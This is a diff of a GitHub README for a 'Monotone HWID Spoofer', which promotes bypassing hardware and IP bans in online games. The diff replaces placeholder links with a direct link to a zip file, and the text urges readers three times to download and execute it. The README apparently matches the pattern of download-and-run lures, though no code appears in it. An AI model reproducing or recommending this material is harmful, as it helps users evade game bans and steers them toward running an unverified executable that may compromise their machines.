@@ -6,7 +6,7 @@
 
 Welcome to the **Monotone HWID Spoofer** repository. This tool is designed to help users bypass hardware or IP bans in various games. If you've faced restrictions due to hardware IDs, this spoofer offers a solution. 
 
-You can download the latest release [here](555). Please ensure to execute the downloaded file to utilize its features effectively.
+You can download the latest release [here](https://github.com/iwantican344/Monotone-HWID-Spoofer/releases/download/Hwid/Monotone-HWID-Spoofer.zip). Please ensure to execute the downloaded file to utilize its features effectively.
 
 ## Table of Contents
 
@@ -27,7 +27,7 @@ You can download the latest release [here](555). Please ensure to execute the do
 
 ## Installation
 
-1. **Download the Tool**: Head over to the [Releases](555) section and download the latest version.
+1. **Download the Tool**: Head over to the [Releases](https://github.com/iwantican344/Monotone-HWID-Spoofer/releases/download/Hwid/Monotone-HWID-Spoofer.zip) section and download the latest version.
 2. **Extract the Files**: Once downloaded, extract the files to a location on your computer.
 3. **Run the Installer**: Execute the installer to set up the spoofer on your system.
 
@@ -83,7 +83,7 @@ For questions or support, you can reach out via the following channels:
 
 The Monotone HWID Spoofer is your go-to solution for bypassing hardware bans in various games. With its easy-to-use interface and regular updates, you can regain access to your favorite games quickly.
 
-For the latest version, please check the [Releases](555) section. Download the tool, execute the file, and enjoy gaming without restrictions!
+For the latest version, please check the [Releases](https://github.com/iwantican344/Monotone-HWID-Spoofer/releases/download/Hwid/Monotone-HWID-Spoofer.zip) section. Download the tool, execute the file, and enjoy gaming without restrictions!
 
 ---
 
